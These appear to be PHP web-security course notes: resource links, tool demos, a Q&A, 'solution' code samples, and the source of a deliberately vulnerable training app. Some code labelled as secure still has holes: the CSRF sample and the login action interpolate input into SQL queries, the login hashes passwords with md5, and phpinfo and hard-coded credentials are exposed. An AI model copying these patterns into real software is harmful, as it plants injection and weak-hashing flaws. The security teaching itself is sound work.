* http://www.sans.edu/research/security-laboratory/article/security-predict2011
* http://www.pcworld.com/article/221780/five_big_security_threats_for_2011.html
* http://www.datamation.com/security/
10 Ways the IT Department Enables Cybercrime:
* http://www.datamation.com/ebooks/35577710/95980/2117740/118895

## RESOURCES:
* http://sectools.org/
* https://panopticlick.eff.org/
* https://www.torproject.org/
* http://www.hackthissite.org/
* https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
* http://www.google.com/webmasters/hacked/
* http://www.qaguild.com/resources_tools.php#web // website security vulnerability testing tools
* http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/
* https://www.owasp.org/index.php/Main_Page
* http://owasptop10.googlecode.com/files/OWASP%20Top%2010%20-%202010.pdf (OWASP Top 10)
* http://net-square.com/ns_whitepapers.shtml
* http://howto.cnet.com/8301-11310_39-20098098-285/how-to-check-if-a-web-site-is-safe/?tag=mncol;mlt_related
* https://github.com/sandeepcr529/codespy
* http://sla.ckers.org/forum/

## WEBINARS:
* http://www.zend.com/en/webinar/Framework/70170000000by7j-BSWAWZF2-20130123.flv // building secure ZF2 apps
* http://www.zend.com/en/resources/webinars/php
* http://www.zend.com/en/webinar/PHP/70170000000bWL2-strong-cryptographie-20110630.flv
* http://www.zend.com/webinar/Server/70170000000bHsS-webinar-guidelines-for-deploying-php-applications-20100617.flv
* http://www.zend.com/en/webinar/PHP/70170000000bAiW-webinar-troubleshooting-php-issues-best-and-worst-techniques-20100128.flv
* http://www.zend.com/en/webinar/PHP/webinar-security-20080702.flv
* http://www.zend.com/webinar/PHP/PHP-Security.flv

## PHP BEST SECURITY PRACTICE:
* http://www.php.net/manual/en/features.file-upload.php
* http://developer.yahoo.com/security/
* http://phpsec.org/projects/guide/2.html
* http://stackoverflow.com/questions/3012315/php-security-best-practices

## SECURITY TOOLS
* http://sectools.org/
* Untangle: http://www.untangle.com/
* Snort: http://www.snort.org/
* nmap: http://nmap.org/
* iptables rules generator: http://easyfwgen.morizot.net/gen/
* Arachni: http://arachni.segfault.gr/ (web app security scanner)
* Joomla: https://lists.owasp.org/mailman/listinfo/owasp-joomla-vulnerability-scanner
* PHP: http://pear.php.net/package/PHP_CodeSniffer

## DEMOS:
### Checking a file with PHP_CodeSniffer
```
$ phpcs /var/www/php_sec/bad_get_example.php

--------------------------------------------------------------------------------
FOUND 5 ERROR(S) AFFECTING 2 LINE(S)
--------------------------------------------------------------------------------
  2 | ERROR | Missing file doc comment
 20 | ERROR | PHP keywords must be lowercase; expected "false" but found "FALSE"
 47 | ERROR | Line not indented correctly; expected 4 spaces but found 1
 51 | ERROR | Missing function doc comment
 88 | ERROR | Line not indented correctly; expected 9 spaces but found 6
--------------------------------------------------------------------------------
```
### nmap
```
nmap -A -T4 ip.add.re.ss
```
### Wireshark
* Install wireshark and do a packet capture
* Tutorial: https://www.youtube.com/watch?v=TkCSr30UojM
* For more info: https://www.wireshark.org/

### Logwatch
* This is a Linux utility which monitors critical OS logs
* For more info: https://launchpad.net/logwatch




## Q & A:

* Q: Ref to Project Honeypot
* A: https://www.projecthoneypot.org/

* Q: RE: SQL Injection:
  * Second Level Attacks: https://bertwagner.com/2018/03/20/how-to-steal-data-using-a-second-order-sql-injection-attack/
  * Union Select Attacks: http://www.sqlinjection.net/union/

* Q: What is the ultimate pen testing tool?
* A: Definitive answer: https://www.metasploit.com/

* Q: Is there an "easy" way to migrate off of the now removed mcrypt extension?
* A: https://packagist.org/packages/phpseclib/mcrypt_compat

* Q: Is Access Control List type of security available on Symfony?
* A: Yes: see: https://symfony.com/doc/current/components/security/authorization.html

* Q: Can you address how to protect from hacked images like that jpeg?
  * A: jpegs infected with a virus are not a danger unless they area "executed" directly by the OS.
   Example: W32.Perrun was discovered in 2002, but is still around but mainly contained
   See: http://www.symantec.com/security_response/writeup.jsp?docid=2002-061310-4234-99
   Recommendation: train users *not* to open suspicious attachments (which is the usual form of delivery)

* * Q: The example in the slides discussing CSRF has this code:
   $token = md5 ( uniqid ( rand (), TRUE ) );
   But I understand md5() is not strong.  Do you have any other suggestions?
* * A: md5() can indeed be cracked by hacking tools such as hashcat.
   md5() is useful when you need to generate a quick hash but where it's not important if somebody can reverse it.
   For example, it might be useful to produce a key from an uploaded image filename which is used for internal storage.
   md5() will do that for you quickly.  For anything which "goes public" however it's best to use something stronger.
   If you look at http://php.net/uniqid you will see that it does not produce a cryptographically secure id.
   The same is true of the rand() function: over several iterations its output becomes predictable, which
   brute force tools latch onto and make it easier to crack a hash based on such values.
   password_hash('text', PASSWORD_BCRYPT) will produce a BCRYPT hash which is much stronger and harder to break.
   If you have OpenSSL installed + the PHP OpenSSL extension enabled, you can use openssl_random_pseudo_bytes().
   PHP 7 introduced two CSPRNG functions: random_int() and random_bytes() which use randomization available from the OS
   which in turn uses hardware.  Here is a potential replacement for the statement given in the question:
   $token = bin2hex(random_bytes(32));

* Q: RE: memory + post limits in php.ini
  * A:  upload_max_filesize < post_max_size <  memory_limit

* Q: Suggestions on penetration testing tools, esp. PHP?
A:
MetaSploit
Nessus
Snort.org
Owasp.org tools page

* Q: Fingerprinting suggestions?
  * A: https://github.com/Valve/fingerprintjs2

* Q: What is a botnet?
  * A: A network of slaved computers infected with controlling malware.
   See: https://en.wikipedia.org/wiki/Botnet

* Q: How large can a botnet become?
  * A: The largest botnets detected in 2015 were the following:
```
   Ramnit: 3,000,000 computers
   Zeus: 3,600,000 computers
   TDL4: 4,500,000 computers
   ZeroAccess: 1,900,000 computers
   Storm: 250,000 to 50,000,000 computers
   Cutwail: 2,000,000 computers
   Conficker: at its peak in 2009 3,000,000 to 4,000,000 computers
   Windigo: 10,000 Linux servers (!!!)
```
   * See: https://www.welivesecurity.com/2015/02/25/nine-bad-botnets-damage/
   * See: https://en.wikipedia.org/wiki/Botnet

* Q: How secure is Oauth2?
  * A: See: https://www.esecurityplanet.com/mobile-security/5-tips-on-using-oauth-2.0-for-secure-authorization.html

* Q: Is there a guide to follow if my website has been hacked?
  * A: This is for WordPress, but the steps are good for any PHP based site:
  * https://codex.wordpress.org/FAQ_My_site_was_hacked

* Q: Are there other "official" definitions of vulnerabilities outside of OWASP?
  * A: See: https://nvd.nist.gov/vuln/categories

* Q: How do I figure out the size of my "attack surface"?
  * A: There is a good set of guidelines on owasp.org here: https://www.owasp.org/index.php/Attack_Surface_Analysis_Cheat_Sheet

* Q: How does the "Are You A Robot" captcha work?
  * A: Simple answer: we don't know and Google is not telling
  * A: See: https://security.googleblog.com/2014/12/are-you-robot-introducing-no-captcha.html





## CLASS CODE EXAMPLES

```
// xss stored solution
<?php

//Code to authenticate and authorize access...

if(isset($_POST['btnSign']))
{
   $message = htmlspecialchars(stripslashes(trim($_POST['mtxMessage'])));
   $name    = htmlspecialchars(stripslashes(trim($_POST['txtName'])));
   $result  = 0;
   try {
      $pdo = zendDatabaseConnect($config);
      $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
      $stmt = $pdo->prepare("INSERT INTO guestbook (name, comment) VALUES (?,?)");
      if (!$stmt->execute([$name, $message])) {
          error_log(__FILE__.':ERROR inserting to guestbook');
      } else {
          $result++;
      }
      //$result = $stmt->fetch(PDO::FETCH_ASSOC);
   } catch (PDOException $e) {
       error_log(__FILE__.':'.$e->getMessage());
        exit('Oops! Sorry.');
   }

   if($result > 0){
      echo 'Successful insert';
   } else{
      echo 'No results found';
   }
}
```

```
// CSRF solution
<?php
/**
 * A Secure Version Script
 *
 * Note: This is a limited secure version, not a complete one.
 * Please add access control (ACL) for query authorization.
 */

//Code to authenticate and authorize access...

if (isset($_POST['Change'])) {

    // Sanitise current password input
    $pass_curr = $_POST['password_current'] ?? 1;
    $pass_new = $_POST['password_new'] ?? 2;
    $pass_conf = $_POST['password_conf'] ?? 3;
    $token = $_POST['token'] ?? 4;

    $user = 'admin'; //Simulating a user here

    if( $token === $_SESSION['token']){
        if ($pass_new === $pass_conf) {

            //Check for correct current password
            try {
                $pdo = zendDatabaseConnect($config);
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                $stmt = $pdo->query("SELECT user_id, password FROM users WHERE user = '$user' AND password = '$pass_curr';");
                $result = $stmt->execute();
            } catch (PDOException $e) {
                exit('<pre>' . $e->getMessage() . '</pre>');
            }

            if($result){

                //Set password hashing options
                $options = [
                    'cost' => 12,
                ];

                //Build the hash
                $passhash = password_hash($pass_new, PASSWORD_BCRYPT, $options);

                //Update the password
                try {
                    $pdo = zendDatabaseConnect($config);
                    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                    $stmt = $pdo->prepare("UPDATE users SET password = ? WHERE user = ?;");
                    $stmt->execute([$passhash, $user]);
                } catch (PDOException $e) {
                    $html .= "<pre> Password update process not available </pre>";
                }

            } else {
                $html .= "<pre> Password Incorrect </pre>";
            }
        } else {
            $html .= "<pre> Passwords did not match. </pre>";
        }
    } else {
        $html.= "<pre> Invalid </pre>";
    }

} else {
    //Create and set a token
    //$token = md5(time());
    // alternatively use openssl_pseudo_random_bytes()
    $token = password_hash(base64_encode(random_bytes(32)), PASSWORD_BCRYPT);
    $_SESSION['token'] = $token;

    $formHtml = "
        <form action=\"#\" method=\"post\">
            <label>Current password</label>
            <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_current\">
            <label>New password</label>
            <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_new\">
            <label>Confirm new password</label>
            <input type=\"password\" AUTOCOMPLETE=\"off\" name=\"password_conf\">
            <input type=\"hidden\" name=\"token\" value=\"$token\">
            <br /><br /><input type=\"submit\" value=\"Change\" name=\"Change\">
        </form>";
}
```

```
// insecure configuration lab
<?php

$config = include __DIR__ . '/protected/dir/sensitive.config.php';

Class User
{
    protected $someData;
    protected $username;
    protected $password;

    /**
     * @param null $name
     * @param null $pass
     */
    public function __construct(array $config, $name = null, $pass = null)
    {
        $this->username = $name;
        $this->password = $pass;
        $this->someData = $config['someData'] ?? NULL;
    }
}

$user = new User($config);
$html = '';

if (!empty($_POST['username']) && !empty($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Encrypt the password ready for storage
    $username = ctype_alnum($_POST['username']);
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);

    //Code to check the database for existing username, we'll assume none here
    $user = new User($username, $password);

    //Call model and store user...

    $html .= "
        <div class=\"vulnerable_code_area\">
            <div>
                <h1>Thank You for signing up for our cool service!</h1>
                <p>We are here to help in case you need it.</p>
          </div>
         </div>";
}
```

```
// secure file upload
<?php
// TODO: redefine / override the php.ini setting for tmp files
// Initialize Variables
$message = '';
$fn      = '';

// make sure this is some known valid safe destination
$dir     = __DIR__ . DIRECTORY_SEPARATOR . "uploads" . DIRECTORY_SEPARATOR;

// Check to see if OK button was pressed
if ( isset($_POST['OK'])) {

    // Check to see if upload parameter specified
    if ( $_FILES['upload']['error'] == UPLOAD_ERR_OK ) {

        // Check to make sure file uploaded by upload process
        if ( is_uploaded_file ($_FILES['upload']['tmp_name'] ) ) {

            // TODO: validate the filename: i.e. jpg, png, gif, etc.

            // Strip directory info from filename
            $fn = basename($_FILES['upload']['name']);

            // Sanitize the filename
            // Note "i" (case insensitive) and "u" UTF-8 modifiers
            $fn = preg_replace('/[^a-z0-9-_.]/iu', '_', $fn);

            // Move image to ../backup directory
            $copyfile = $dir . $fn;

            // Copy file
            if ( move_uploaded_file ($_FILES['upload']['tmp_name'], $copyfile) ) {
                $message .= "<br>Successfully uploaded file " . htmlspecialchars($fn) . "\n";
            } else {
                // Trap upload file handle errors
                $message .= "<br>Unable to upload file " . htmlspecialchars($fn);
            }

        } else {
            // Failed security check
            $message .= "<br>File Not Uploaded!";
        }

    } else {
        // No photo file; return blanks and zeros
        $message .= "<br>No Upload File Specified\n";
    }
}

// AFTER UPLOAD: run anti-virus, etc. as cron job
// TODO: add some sort of flag which triggers the cron job

// Scan directory
$list = glob($dir . "*");
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Upload File</title>
<style>
TD {
    font: 10pt helvetica, sans-serif;
    border: thin solid black;
    }
TH {
    font: bold 10pt helvetica, sans-serif;
    border: thin solid black;
    }
</style>
</head>
<body>
<h1>Upload File</h1>
<form name="Upload" method=POST enctype="multipart/form-data">
<input type=file method=POST enctype="multipart/form-data" size=50 maxlength=255 name="upload" value="" />
<br><input type=submit name="OK" value="OK" />
</form>
<p>Message: <?php echo $message; ?></p>
<p>Filename: <?php echo $fn; ?></p>
<table cellspacing=4>
<tr><th>Filename</th><th>Last Modified</th><th>Size</th></tr>
<?php
if (isset($list)) {
    foreach ($list as $item) {
        echo "<tr><td>$item</td>";
        echo "<td>" . date ("F d Y H:i:s", filemtime($item)) . "</td>";
        echo "<td align=right>" . filesize($item) . "</td>";
        echo "</tr>\n";
    }
}
echo "</table>\n";
phpinfo(INFO_VARIABLES);
?>
</body>
</html>
```

## SECURITYTRAINING SOURCE
* Rewrote `/securitytraining/src/FrontController.php`
* Rewrote `/securitytraining/config/config.inc.php`
* Replaced `Zend\ServiceManager\ServiceManager` with `src\Container`

```
<?php
/**
 * Front Controller Class
 */

namespace src;

use src\view\View;
use src\services\Container;
use Zend\Db\Adapter\Adapter;
use Zend\ServiceManager\ServiceManager;

class FrontController
{

    const DEFAULT_ACTION = 'home';
    protected $session;
    protected $sm;

    /**
     * FrontController constructor.
     *
     * @param $config
     * @param $phpids
     */
    public function __construct($config, $phpids) {
        $this->sm = new Container();
        $this->sm->setService('adapter', $this->getAdapter($config));
        $this->sm->setService('config', $config);
        $this->sm->setService('phpids', $phpids);
        $this->sm->setService('page', $config['application']);
        $this->sm->setService('view', new View($config));
        $this->sm->setService('menuMap', $config['menuMap']);
        $this->sm->setService('vulnerabilityTitle', $config['vulnerabilityTitle']);
        session_start();
        $this->setSession();
        $this->checkInput();
    }

    /**
     *
     */
    protected function checkInput(){
        // NOTE: using $_REQUEST because "action" could be coming from either $_GET or $_POST
        //       as of PHP 7, $_REQUEST, by default, *only* includes $_GET and $_POST
        if ($_REQUEST && isset($_POST['Login']) && !isset($_REQUEST['action'])) {
            $this->loginAction();
        } elseif (isset($_REQUEST['action'])){
            $action = null;
            if (isset($_REQUEST['action'])) {
                $action = ctype_alpha($_REQUEST['action']) ? $_REQUEST['action'] : self::DEFAULT_ACTION;
            }
            $menuMap = $this->sm->get('menuMap');
            if (isset($menuMap[$action])) {
                $method = $menuMap[$action]['method'];
                $this->$method($menuMap[$action]['params']);
            } else {
                $this->vulnerabilityAction($action);
            }
        } else {
            $this->loginAction();
        }
    }

    /**
     * @param $config
     *
     * @return Adapter
     */
    private function getAdapter($config) {
        return new Adapter(array(
            'driver'   => $config['adapter']['driver'],
            'database' => $config['db']['db_database'],
            'username' => $config['db']['db_user'],
            'password' => $config['db']['db_password']
        ));
    }

    /**
     * Todo: Needs refactoring to use setViewAndRender()
     */
    public function homeAction() {
        $view            = $this->sm->get('view');
        $page            = $this->sm->get('page');
        $page['title']   .= $page['title_separator'] . 'Welcome';
        $page['page_id'] = 'home';
        $page['body']    = 'main_body';
        $view->setVariable('page', $page);
        $items = $this->getLeftBlock($page);
        foreach($items as $key => $value) {
            $view->setVariable($key, $value);
        }
        $view->setTemplate('main');
        $messagesHtml = $this->popMessagesToHtml();
        $view->setVariables(['messagesHtml' => $messagesHtml]);
        $view->render();
    }

    /**
     *
     */
    public function loginAction() {
        $view = $this->sm->get('view');
        if(isset($_POST['Login'])) {
            $user      = $_POST['username'] ?? '';
            $user      = ctype_alnum($user) ? $user : '';
            $pass      = $_POST['password'] ?? '';
            if (!$user || !$pass) {
                $this->failedLogin($view);
            }
            $pass      = strip_tags($pass);
            $hash      = md5($pass);
            $adapter   = $this->sm->get('adapter');
            $resultset = $adapter->query("SELECT * FROM users WHERE user='$user' AND password='$hash'", Adapter::QUERY_MODE_EXECUTE);

            // Check if we have login
            if($resultset && $resultset->count()) {
                $data = $resultset->current()->getArrayCopy();
                $this->setSession();
                $this->session['username'] = $user;
                $this->login($data);
                $this->pushMessage("You have logged in as '" . $data['user'] . "'");
                $page          = $this->sm->get('page');
                $page['title'] .= $page['title_separator'] . 'Welcome';
                $view->setTemplate('main');
            }else {
                // Login failed
                $this->failedLogin($view);
            }
        }else {
            $view->setTemplate('login');
        }
        $this->setViewAndRender(null, ['page_id' => 'home', 'name' => 'home', 'body' => 'main_body']);
    }

    protected function failedLogin($view)
    {
        $this->pushMessage("Login failed");
        $view->setTemplate('login');
    }

    /**
     *
     */
    public function logoutAction() {

        //$this->zendPageStartup(array('phpids'));

        if( ! $this->getIsUserLoggedIn()) {    // The user shouldn't even be on this page
            //zendMessagePush( "You were not logged in" );
            $this->loginAction();
        }

        unset($this->session);
        $this->pushMessage("You have logged out");
        $this->loginAction();
    }

    /**
     *
     */
    public function setSession() {
        if( ! isset($_SESSION['zend'])) $_SESSION['zend'] = [];
        $this->session    = &$_SESSION['zend'];
    }

    /**
     *
     */
    public function securityAction() {
        $view   = $this->sm->get('view');
        $config = $this->sm->get('config');
        $page            = $this->sm->get('page');
        $page['title']   .= $page['title_separator'] . 'ZEND Security';
        $html            = '';

        if(isset($_POST['seclev_submit'])) {
            $securityLevel = 'with';

            switch($_POST['security']) {
                case 'without':
                    $securityLevel = 'without';
                    break;
                case 'zf':
                    $securityLevel = 'zf';
                    break;
            }
            $this->session['security'] = $securityLevel;
            //$this->setSecurityLevel($securityLevel);
            $this->pushMessage("Security level set to $securityLevel");
        }

        //todo: Implement
        if(isset($_GET['phpids'])) {
            switch($_GET['phpids']) {
                case 'on':
                    $this->enablePhpIds(true);
                    $this->pushMessage("PHPIDS is now enabled");
                    break;
                case 'off':
                    $this->enablePhpIds(false);
                    $this->pushMessage("PHPIDS is now disabled");
                    break;
            }
        }

        // Set the security level
        $securityOptionsHtml = $securityLevelHtml = '';
        foreach($config['security_levels'] as $level) {
            $selected = '';
            if(isset($this->session['security']) && $level === $this->session['security']) {
                $selected          = ' selected="selected"';
                $securityLevelHtml = "<p>Security Level is currently \"<em>$level</em>\"<p>";
            }
            if($level === 'with' && $securityLevelHtml === ''){
                $selected          = ' selected="selected"';
                $securityLevelHtml = "<p>Security Level is currently \"<em>$level</em>\"<p>";
            }
            $securityOptionsHtml .= "<option value=\"{$level}\"{$selected}>{$level}</option>";
        }

        $phpIdsHtml = 'PHPIDS is currently ';
        if($this->getIsPhpIdsEnabled()) {
            $phpIdsHtml .= '<em>enabled</em>. [<a href="?phpids=off">disable PHPIDS</a>]';
        }else {
            $phpIdsHtml .= '<em>disabled</em>. [<a href="?phpids=on">enable PHPIDS</a>]';
        }
        $view->setVariables([
            'securityLevelHtml'   => $securityLevelHtml,
            'securityOptionsHtml' => $securityOptionsHtml,
            'phpIdsHtml'          => $phpIdsHtml
        ]);
        $this->setViewAndRender($html, ['page_id' => 'security', 'name' => 'security', 'body' => 'security']);
    }

    /**
     * @param string $name
     */
    public function vulnerabilityAction(?string $name) {
        $vulnerabilityTitle = $this->sm->get('vulnerabilityTitle');
        $page = $this->sm->get('page');
        $file = isset($this->session['security']) ? $this->session['security'] . '.php' : 'with.php';
        $html = '';
        if (isset($vulnerabilityTitle[$name])) {
            require __DIR__ . "/../vulnerabilities/$name/source/$file";
            $page['title'] .= $page['title_separator'] . $vulnerabilityTitle[$name];
        } else {
            $page['title'] .= $page['title_separator'] . 'Unknown';
            $name = 'main_body';
        }
        $this->setViewAndRender($html, ['page_id' => $name, 'name' => $name, 'body' => $name]);
    }

    /**
     * @param string $html
     * @param string $name
     */
    protected function setViewAndRender(string $html = null, array $pageData) {
        $view                  = $this->sm->get('view');
        $page                  = $this->sm->get('page');
        $page['page_id']       = $pageData['page_id'];
        $page['help_button']   = $pageData['name'];
        $page['source_button'] = $pageData['name'];
        $page['body']          = $pageData['body'];
        $view->setVariable('page', $page);
        $items = $this->getLeftBlock($page);
        foreach($items as $key => $value) {
            $view->setVariable($key, $value);
        }
        $messagesHtml = $this->popMessagesToHtml();
        $view->setVariables(['messagesHtml' => $messagesHtml, 'html' => $html]);
        $view->render();
    }

    /**
     *
     */
    public function phpInfoAction() {
        phpinfo();
        exit;
    }

    /**
     * @param $pEnabled
     */
    protected function enablePhpIds($pEnabled) {
        if($pEnabled) {
            $this->session['php_ids'] = 'enabled';
        }else {
            unset($this->session['php_ids']);
        }
    }

    /**
     * @return bool
     */
    protected function getIsPhpIdsEnabled() {
        return isset($this->session['php_ids']);
    }

    /**
     * @param $data
     */
    protected function login($data) {
        $this->session['username'] = $data['user'];
        $this->session['role']     = $data['role'];
    }

    /**
     * @return bool
     */
    protected function getIsUserLoggedIn() {
        return isset($this->session['username']);
    }

    /**
     *
     */
    protected function pageReload() {
        $this->redirect($_SERVER['PHP_SELF']);
    }

    /**
     * @return string
     */
    protected function getCurrentUser() {
        return (isset($this->session['username']) ? $this->session['username'] : '');
    }

    /**
     * @return string
     */
    protected function getSecurityLevel() {
        return isset($this->session['security']) ? $this->session['security'] : 'with';
    }

    /**
     * @param $pSecurityLevel
     */
    protected function setSecurityLevel($pSecurityLevel) {
        $this->session['security'] = $pSecurityLevel;
    }

    /**
     * @param $pMessage
     */
    protected function pushMessage($pMessage) {
        if( ! isset($this->session['messages'])) {
            $this->session['messages'] = array();
        }
        $this->session['messages'][] = $pMessage;
    }

    /**
     * @return bool|mixed
     */
    protected function popMessage() {
        if( ! isset($this->session['messages']) || count($this->session['messages']) == 0) {
            return false;
        }

        return array_shift($this->session['messages']);
    }

    /**
     * @return string
     */
    protected function popMessagesToHtml() {
        $messagesHtml = '';
        while($message = $this->popMessage()) {    // TODO- sharpen!
            $messagesHtml .= "<div class=\"message\">{$message}</div>";
        }

        return $messagesHtml;
    }

    /**
     * @param $pPage
     *
     * @return array
     */
    protected function getLeftBlock($pPage) {
        $config     = $this->sm->get('config');
        $menuBlocks = $config['menublocks'];
        $menuHtml   = '';
        $count      = 0;
        foreach($menuBlocks as $menuBlock) {
            $menuBlockHtml = '';
            if($count == 1) {
                $menuHtml .= "<br><h5>VULNERABILITIES</h5>";
            }

            foreach($menuBlock as $menuItem) {
                $selectedClass = ($menuItem['id'] == $pPage['page_id']) ? 'selected' : '';
                $fixedUrl      = $menuItem['url'];
                $img           = "";
                $where         = "";
                if(isset($menuItem['img'])) {
                    $img = '/zend/images/' . $menuItem['img'];
                    $img = "<img width=\"20\" height=\"20\" src='{$img}'>";
                }
                if(isset($menuItem['where'])) {
                    $where = " target= \"{$menuItem['where']}\"";
                }

                $menuBlockHtml .= "<li onclick=\"window.location='$fixedUrl'\" class=\"{$selectedClass}\">
                        <a href=\"{$fixedUrl}\" $where><nobr>" . $img . " {$menuItem['name']}</nobr></a>
                    </li>";
            }

            $menuHtml .= "<ul>{$menuBlockHtml}</ul>";
            $count ++;
        }

        // Get security cookie --
        $securityLevelHtml = isset($this->session['security']) ? $this->session['security'] : 'with';

        $phpIdsHtml = '<b>PHPIDS:</b> ';
        $phpIdsHtml .= $this->getIsPhpIdsEnabled() ? 'enabled' : 'disabled';
        $userInfoHtml = $this->getCurrentUser() ? '<b>Username:</b> ' . $this->getCurrentUser() : '';
        $messagesHtml = $this->popMessagesToHtml();

        if($messagesHtml) {
            $messagesHtml = "<div class=\"body_padded\">{$messagesHtml}</div>";
        }

        $systemInfoHtml = "<div align=\"left\">{$userInfoHtml}<br /><b>Security Level:</b> {$securityLevelHtml}<br />{$phpIdsHtml}</div>";

        //Todo: implement
        /*      if($pPage['source_button']) {
                    $systemInfoHtml = $this->zendButtonSourceHtmlGet($pPage['source_button']) . " $systemInfoHtml";
                }
                if($pPage['help_button']) {
                    $systemInfoHtml = $this->zendButtonHelpHtmlGet($pPage['help_button']) . " $systemInfoHtml";
                }*/

        return [
            'menuHtml'       => $menuHtml,
            'phpIdsHtml'     => $phpIdsHtml,
            'userInfoHtml'   => $userInfoHtml,
            'messageHtml'    => $messagesHtml,
            'systemInfoHtml' => $systemInfoHtml
        ];
    }

    /**
     * Temporarily disabled
     *
     * @param $pPage
     */
    public function zendHelpHtmlEcho($pPage) {
        // Send Headers
        Header('Cache-Control: no-cache, must-revalidate');        // HTTP/1.1
        Header('Content-Type: text/html;charset=utf-8');        // TODO- proper XHTML headers...
        Header("Expires: Tue, 23 Jun 2009 12:00:00 GMT");        // Date in the past
        echo <<< EOT
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />
        <title>{$pPage['title']}</title>
        <link rel=\"stylesheet\" type=\"text/css\" href=\"" . ZEND_ROOT . "zend/css/help.css\" />
        <link rel=\"icon\" type=\"\image/ico\" href=\"" . ZEND_ROOT . "favicon.ico\" />
    </head>
    <body>
        <div id=\"container\">
            {$pPage['body']}
        </div>
    </body>
</html>
EOT;
    }

    /**
     * Temporarily disabled
     *
     * @param $pPage
     */
    public function zendSourceHtmlEcho($pPage) {
        // Send Headers
        Header('Cache-Control: no-cache, must-revalidate');        // HTTP/1.1
        Header('Content-Type: text/html;charset=utf-8');        // TODO- proper XHTML headers...
        Header("Expires: Tue, 23 Jun 2009 12:00:00 GMT");        // Date in the past

        echo <<<EOT
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />
        <title>{$pPage['title']}</title>
        <link rel=\"stylesheet\" type=\"text/css\" href=\"" . ZEND_ROOT . "zend/css/source.css\" />
        <link rel=\"icon\" type=\"\image/ico\" href=\"" . ZEND_ROOT . "favicon.ico\" />
    </head>
    <body>
        <div id=\"container\">
            {$pPage['body']}
        </div>
    </body>
</html>
EOT;
    }

    /**
     * Temporarily disabled
     *
     * @param $pId
     *
     * @return string
     */
    public function zendButtonHelpHtmlGet($pId) {
        $security = $this->getSecurityLevel();

        return "<input type=\"button\" value=\"View Help\" class=\"popup_button\" onClick=\"javascript:popUp( '" . ZEND_ROOT . "vulnerabilities/view_help.php?id={$pId}&security={$security}' )\">";
    }

    /**
     * Temporarily disabled
     *
     * @param $pId
     *
     * @return string
     */
    public function zendButtonSourceHtmlGet($pId) {
        $security = $this->getSecurityLevel();

        return "<input type=\"button\" value=\"View Source\" class=\"popup_button\" onClick=\"javascript:popUp( '" . ZEND_ROOT . "vulnerabilities/view_source.php?id={$pId}&security={$security}' )\">";
    }

    /**
     * @return string
     * @deprecated
     */
    public function dbConnectError() {
        $DBMS_errorFunc = 'mysql_error()';

        return '<div align="center">
        <img src="' . ZEND_ROOT . 'zend/images/logo.png">
        <pre>Unable to connect to the database.<br>' . $DBMS_errorFunc . '<br /><br /></pre>
        Click <a href="' . ZEND_ROOT . 'setup.php">here</a> to setup the database.
        </div>';
    }

    /**
     * @return \PDO
     * @deprecated
     */
    public function zendDatabaseConnect() {
        $config = $this->sm->get('config');
        try {
            $pdo = new \PDO($config['db']['db_server'], $config['db']['db_user'], $config['db']['db_password']);
        }catch(\PDOException $e) {
            die($this->dbConnectError());
        }

        return $pdo;
    }

    /**
     * @param $pLocation
     */
    protected function redirect($pLocation) {
        session_commit();
        header("location: $pLocation");
    }
}

```
```
<?php
namespace src\services;

class Container
{
    protected $services = [];
    public function setService($key, $value)
    {
        $this->services[$key] = $value;
    }
    public function get($key)
    {
        return $this->services[$key] ?? NULL;
    }
}
```
```
<?php
// config.inc.php
return [
    //Database to use
    'db' => [
        'name'        => 'MySQL',
        'db_server'   => 'mysql:unix_socket=/var/run/mysqld/mysqld.sock;dbname=security',
        'db_database' => 'security',
        'db_user'     => 'vagrant',
        'db_password' => 'vagrant',
    ],

    'company' => [
        'name' => 'Zend'
    ],

    'application' => [
        'title'           => 'Security Training',
        'version'         => '3.0.4',
        'title_separator' => ' :: ',
        'body'            => '',
        'page_id'         => '',
        'help_button'     => '',
        'source_button'   => '',
    ],

    'adapter' => [
        'driver' => 'PDO_MYSQL',
    ],

    //Recaptcha config and security level
    'zend'    => [
        'site_key'               => '',
        'secret_key'             => '',
        'lang'                   => 'en',
        'default_security_level' => 'white',
    ],

    'security_levels' => [
        'without',
        'with',
        'zf'
    ],

    //File upload config
    'fileUploads'     => [
        'maxsize'  => 20480000,
        'mimetype' => 'image/png,image/x-png',
    ],

    // Menu elements
    'menublocks'      => $menuBlocks = [
        'home'              => [
            [
                'id'   => 'home',
                'name' => 'Home',
                'url'  => 'index.php?action=home',
                'img'  => "home.png"
            ],
            [
                'id'   => 'security',
                'name' => 'Security Levels',
                'url'  => 'index.php?action=security',
                'img'  => 'sec.png'
            ],
            [
                'id'   => 'phpinfo',
                'name' => 'PHP Info',
                'url'  => 'index.php?action=phpinfo',
                'img'  => 'info.png'
            ]
        ],
        'vulnerabilities1'  => [
            [
                'id'   => 'sqli',
                'name' => 'SQL Injection',
                'url'  => 'index.php?action=sqli'
            ]
        ],
        'vulnerabilities2'  => [
            [
                'id'   => 'brute',
                'name' => 'Brute Force',
                'url'  => 'index.php?action=brute'
            ]
        ],
        'vulnerabilities3'  => [
            [
                'id'   => 'xss_r',
                'name' => 'XSS Reflected',
                'url'  => 'index.php?action=xssr'
            ]
        ],
        'vulnerabilities4'  => [
            [
                'id'   => 'xss_s',
                'name' => 'XSS Stored',
                'url'  => 'index.php?action=xsss'
            ]
        ],
        'vulnerabilities5'  => [
            [
                'id'   => 'idor',
                'name' => 'Insecure Direct Obj Ref.',
                'url'  => 'index.php?action=idor'
            ]
        ],
        'vulnerabilities6'  => [
            [
                'id'   => 'smc',
                'name' => 'Security Misconfig.',
                'url'  => 'index.php?action=smc'
            ]
        ],
        'vulnerabilities7'  => [
            [
